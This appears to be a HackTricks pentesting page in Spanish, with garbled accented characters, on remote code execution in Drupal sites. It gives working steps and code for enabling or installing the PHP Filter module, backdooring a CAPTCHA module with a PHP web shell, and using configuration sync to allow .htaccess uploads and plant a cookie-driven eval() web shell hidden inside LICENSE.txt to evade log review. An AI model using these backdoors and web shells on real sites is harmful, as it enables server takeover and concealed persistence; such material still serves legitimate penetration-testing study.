# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Con el m贸dulo PHP Filter

{% hint style="warning" %}
En versiones anteriores de Drupal **(antes de la versi贸n 8)**, era posible iniciar sesi贸n como administrador y **habilitar el m贸dulo `PHP filter`**, que "Permite que se eval煤e el c贸digo/snippets PHP incrustados." Pero a partir de la versi贸n 8, este m贸dulo no se instala por defecto.
{% endhint %}

Necesitas que el **plugin php est茅 instalado** (verif铆calo accediendo a _/modules/php_ y si devuelve un **403** entonces, **existe**, si **no se encuentra**, entonces **el plugin php no est谩 instalado**)

Ve a _M贸dulos_ -> (**Verificar**) _PHP Filter_ -> _Guardar configuraci贸n_

![](<../../../.gitbook/assets/image (247) (1).png>)

Luego haz clic en _Agregar contenido_ -> Selecciona _P谩gina b谩sica_ o _Art铆culo_ -> Escribe _php shellcode en el cuerpo_ -> Selecciona _C贸digo PHP_ en _Formato de texto_ -> Selecciona _Vista previa_

![](<../../../.gitbook/assets/image (338).png>)

Finalmente, solo accede al nodo reci茅n creado:
```bash
curl http://drupal-site.local/node/3
```
## Instalar el M贸dulo PHP Filter

{% hint style="warning" %}
En las versiones actuales, ya no es posible instalar plugins solo teniendo acceso a la web despu茅s de la instalaci贸n predeterminada.
{% endhint %}

A partir de la versi贸n **8**, el **[M贸dulo PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1)** **no est谩 instalado por defecto**. Para aprovechar esta funcionalidad, tendr铆amos que **instalar el m贸dulo nosotros mismos**.

1. Descargue la versi贸n m谩s reciente del m贸dulo desde el sitio web de Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una vez descargado, vaya a **`Administraci贸n`** > **`Informes`** > **`Actualizaciones disponibles`**.
3. Haga clic en **`Examinar`**, seleccione el archivo del directorio al que lo descarg贸 y luego haga clic en **`Instalar`**.
4. Una vez que el m贸dulo est茅 instalado, podemos hacer clic en **`Contenido`** y **crear una nueva p谩gina b谩sica**, similar a como lo hicimos en el ejemplo de Drupal 7. Nuevamente, aseg煤rese de **seleccionar `C贸digo PHP` del men煤 desplegable `Formato de texto`**.

## M贸dulo con Puerta Trasera

{% hint style="warning" %}
En las versiones actuales, ya no es posible instalar plugins solo teniendo acceso a la web despu茅s de la instalaci贸n predeterminada.
{% endhint %}

Un m贸dulo con puerta trasera se puede crear **agregando un shell a un m贸dulo existente**. Los m贸dulos se pueden encontrar en el sitio web drupal.org. Elijamos un m贸dulo como [CAPTCHA](https://www.drupal.org/project/captcha). Despl谩cese hacia abajo y copie el enlace para el tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Descargue el archivo y extraiga su contenido.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Crea un **PHP web shell** con el contenido:
```php
<?php
system($_GET["cmd"]);
?>
```
* A continuaci贸n, necesitamos crear un **`.htaccess`** archivo para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la **`/modules`** carpeta.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configuraci贸n anterior aplicar谩 reglas para la carpeta / cuando solicitemos un archivo en /modules. Copie ambos archivos en la carpeta captcha y cree un archivo.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Asumiendo que tenemos **acceso administrativo** al sitio web, haz clic en **`Administrar`** y luego en **`Extender`** en la barra lateral. A continuaci贸n, haz clic en el bot贸n **`+ Instalar nuevo m贸dulo`**, y seremos llevados a la p谩gina de instalaci贸n, como `http://drupal-site.local/admin/modules/install`. Navega hasta el archivo de Captcha con puerta trasera y haz clic en **`Instalar`**.
* Una vez que la instalaci贸n sea exitosa, navega a **`/modules/captcha/shell.php`** para ejecutar comandos.

## Puerta trasera en Drupal con sincronizaci贸n de configuraci贸n <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Publicaci贸n compartida por** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Parte 1 (activaci贸n de _Media_ y _Media Library_)

En el men煤 _Extender_ (/admin/modules), puedes activar lo que parecen ser plugins ya instalados. Por defecto, los plugins _Media_ y _Media Library_ no parecen estar activados, as铆 que activ茅moslos.

Antes de la activaci贸n:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Despu茅s de la activaci贸n:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Parte 2 (aprovechando la funci贸n _Sincronizaci贸n de configuraci贸n_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Aprovecharemos la funci贸n _Sincronizaci贸n de configuraci贸n_ para volcar (exportar) y subir (importar) entradas de configuraci贸n de Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Parchear system.file.yml**

Comencemos parcheando la primera entrada `allow_insecure_uploads` de:

Archivo: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

A:

Archivo: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Parchear field.field.media.document.field\_media\_document.yml**

Luego, parchea la segunda entrada `file_extensions` de: 

Archivo: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

A:

Archivo: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> No lo uso en esta publicaci贸n del blog, pero se se帽ala que es posible definir la entrada `file_directory` de manera arbitraria y que es vulnerable a un ataque de traversal de ruta (as铆 que podemos retroceder dentro del 谩rbol del sistema de archivos de Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Parte 3 (aprovechando la funci贸n _Agregar Documento_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

El 煤ltimo paso es el m谩s simple y se descompone en dos sub-pasos. El primero es subir un archivo en formato .htaccess para aprovechar las directivas de Apache y permitir que los archivos .txt sean interpretados por el motor PHP. El segundo es subir un archivo .txt que contenga nuestra carga 煤til.

Archivo: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
驴Por qu茅 es genial este truco?

Porque una vez que el Webshell (que llamaremos LICENSE.txt) se coloca en el servidor web, podemos transmitir nuestros comandos a trav茅s de `$_COOKIE` y en los registros del servidor web, esto aparecer谩 como una solicitud GET leg铆tima a un archivo de texto.

驴Por qu茅 nombrar nuestro Webshell LICENSE.txt?

Simplemente porque si tomamos el siguiente archivo, por ejemplo [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (que ya est谩 presente en el n煤cleo de Drupal), tenemos un archivo de 339 l铆neas y 17.6 KB de tama帽o, que es perfecto para agregar un peque帽o fragmento de c贸digo PHP en el medio (ya que el archivo es lo suficientemente grande).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Archivo: LICENSE.txt parcheado
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Parte 3.1 (subir archivo .htaccess)**

Primero, aprovechamos la funci贸n _Agregar Documento_ (/media/add/document) para subir nuestro archivo que contiene las directivas de Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Parte 3.2 (subir archivo LICENSE.txt)**

Luego, aprovechamos nuevamente la funci贸n _Agregar Documento_ (/media/add/document) para subir un Webshell oculto dentro de un archivo de licencia.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Parte 4 (interacci贸n con el Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

La 煤ltima parte consiste en interactuar con el Webshell.

Como se muestra en la siguiente captura de pantalla, si la cookie esperada por nuestro Webshell no est谩 definida, obtenemos el resultado subsiguiente al consultar el archivo a trav茅s de un navegador web.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Cuando el atacante establece la cookie, puede interactuar con el Webshell y ejecutar cualquier comando que desee.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Y como puedes ver en los registros, parece que solo se ha solicitado un archivo txt.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Gracias por tomarte el tiempo de leer este art铆culo, espero que te ayude a obtener algunas shells.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
